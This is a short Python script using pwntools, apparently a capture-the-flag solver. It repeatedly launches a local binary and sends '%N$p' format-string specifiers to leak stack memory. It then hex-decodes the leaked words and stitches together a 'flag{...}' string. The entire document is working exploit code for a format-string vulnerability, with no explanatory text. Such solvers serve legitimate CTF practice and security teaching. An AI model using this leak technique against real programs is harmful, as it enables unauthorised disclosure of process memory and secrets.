from pwn import *
from binascii import unhexlify

def Format_easy(e):

    total = []
    for i in range(20):
        p = process(e.path, level="error")
        p.sendline("%%%d$p" % i)
        p.recvuntil(":")

        leak = p.recvline().strip().decode().split(' ')[0].strip("0x")

        try:
            out = unhexlify(leak)[::-1].decode()
            total.append(out)
        except:
            pass

        p.close()

    flag = []
    count = -1
    start = 0
    end = 0
    for j in total:
        count +=1
        if "flag{" in j:
            start = count
            flag.append(j)
        if "}" in j:
            end = count
            flag.append(j)

    for g in range(start,end+1):
        print(total[g],end='')
    print("\n")

